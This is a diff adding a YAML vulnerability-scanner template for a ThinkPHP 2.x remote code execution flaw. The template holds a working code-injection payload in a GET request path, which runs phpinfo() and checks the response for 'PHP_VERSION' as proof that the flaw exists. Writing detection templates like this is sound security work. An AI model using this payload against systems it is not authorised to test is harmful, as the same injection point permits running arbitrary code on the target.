@@ -1,0 +1,26 @@
+id: VUL-2019-10006
+name: kuangjia-zhongjianjian_thinkphp_2-rce
+tags:
+    - thinkphp
+transport: http
+rules:
+    req:
+        request:
+            cache: false
+            method: GET
+            path: /index.php?s=/index/index/name/${@phpinfo()}
+        expression: response.status==200  && response.body.bcontains(b'PHP_VERSION')
+        output: null
+expression: req()
+detail:
+    fingerprint:
+        softhard: ""
+        product: ""
+        company: ""
+        category: ""
+        parent_category: ""
+    vulnerability:
+        proof:
+            info: 存在kuangjia-zhongjianjian_thinkphp_2-rce漏洞
+
+
